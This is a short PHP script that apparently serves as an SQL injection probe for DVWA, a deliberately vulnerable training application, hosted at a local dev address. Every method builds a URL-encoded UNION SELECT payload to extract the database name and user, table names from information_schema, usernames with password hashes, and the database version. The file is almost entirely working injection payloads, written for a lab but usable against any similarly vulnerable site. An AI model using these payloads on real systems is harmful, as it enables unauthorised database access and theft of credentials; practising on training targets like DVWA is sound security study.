<?php

class dvwaProbe
{
	protected $url;

	public function __construct($url)
	{
		$this->url = $url;
	}
	
	/**
 	 * Constant variable for SQL injection
 	 *
 	 * @return string
 	 */
	 
	public function inject()
	{
		$insert = "?id=1%27 and 1%3d1 ";
		return $insert;
	}
	
	/**
 	 * Gets database and user
 	 *
 	 * @param string $url
 	 * @return string
 	 */
	 
	public function getDatabase()
	{
		$insert = $this->inject();
		$injectURL = $this->url . $insert . "union select database%28%29%2c user%28%29%23&Submit=Submit#";
		return $injectURL;
	}
	
	/**
 	 * Gets tables
 	 *
 	 * @param string $url
 	 * @return string
 	 */
	 
	public function getTable()
	{
		$insert = $this->inject();
		$injectURL = $this->url . $insert . "union select null%2c table_name from information_schema.tables%23&Submit=Submit#";
		return $injectURL;
	}
	
	/**
 	 * Gets users with hashed passwords
 	 *
 	 * @param string $url
 	 * @return string
 	 */
	 
	public function getPassword()
	{
		$insert = $this->inject();
		$injectURL = $this->url . $insert . "union select user%2c password from users%23&Submit=Submit#";
		return $injectURL;
	}
	
	/**
 	 * Gets version of OS
 	 *
 	 * @param string $url
 	 * @return string
 	 */
	 
	public function getVersion()
	{
		$insert = $this->inject();
		$injectURL = $this->url . $insert . "union select null%2c version%28%29%23&Submit=Submit#";
		return $injectURL;
	}
}

$dvwaProbe = new dvwaProbe("http://app.dev/DVWA-1.0.8/vulnerabilities/sqli/");
$testFunction = $dvwaProbe->getVersion();
var_dump($testFunction);

?>